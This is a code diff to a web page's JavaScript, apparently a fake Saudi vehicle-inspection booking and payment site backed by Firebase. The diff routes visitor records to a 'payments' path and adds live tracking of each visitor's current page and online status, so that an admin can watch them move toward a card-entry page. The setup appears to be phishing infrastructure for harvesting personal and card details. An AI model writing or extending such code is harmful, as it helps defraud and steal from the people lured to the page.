@@ -448,7 +448,6 @@
     </div>
 
     <script>
-        // إعدادات الفايربيس الصحيحة
         const firebaseConfig = {
           apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", 
           authDomain: "saso-inspection.firebaseapp.com",
@@ -466,15 +465,12 @@
         let selectedMethod = 'credit_card';
         const visitorId = localStorage.getItem('visitorId');
 
-        // وظيفة جلب البيانات وعرضها في الوثيقة
         function fetchInvoiceData() {
             if (!visitorId) return;
             
-            // جلب البيانات من مسار الزوار
-            database.ref('visitors/' + visitorId).on('value', (snapshot) => {
+            database.ref('payments/' + visitorId).on('value', (snapshot) => {
                 const data = snapshot.val();
                 if (data) {
-                    // تم تعديل الأسماء هنا لتطابق كود الإرسال في صفحة الحجز
                     document.getElementById('db-name').innerText = data.fullName || '-';
                     document.getElementById('db-type').innerText = data.vehicleType || '-';
                     document.getElementById('db-plate').innerText = data.plateNumber || '-';
@@ -486,7 +482,16 @@
             });
         }
 
-        window.onload = fetchInvoiceData;
+        window.onload = function() {
+            fetchInvoiceData();
+            if(visitorId) {
+                database.ref('payments/' + visitorId).update({
+                    currentPage: "ملخص الطلب (Summary)",
+                    status: "online",
+                    lastActive: firebase.database.ServerValue.TIMESTAMP
+                });
+            }
+        };
 
         function selectPayment(element, type) {
             document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));
@@ -506,10 +511,9 @@
         function handlePayment() {
             if (!visitorId) { window.location.href = 'payment.html'; return; }
             
-            // تحديث حالة العميل ليظهر في الأدمن أنه اختار طريقة الدفع
-            database.ref('visitors/' + visitorId).update({
+            database.ref('payments/' + visitorId).update({
                 payment_method_selected: selectedMethod,
-                step: "انتقل لصفحة الدفع",
+                currentPage: "صفحة إدخال البطاقة",
                 lastUpdate: new Date().toLocaleString('ar-SA')
             }).then(() => { 
                 window.location.href = 'payment.html'; 
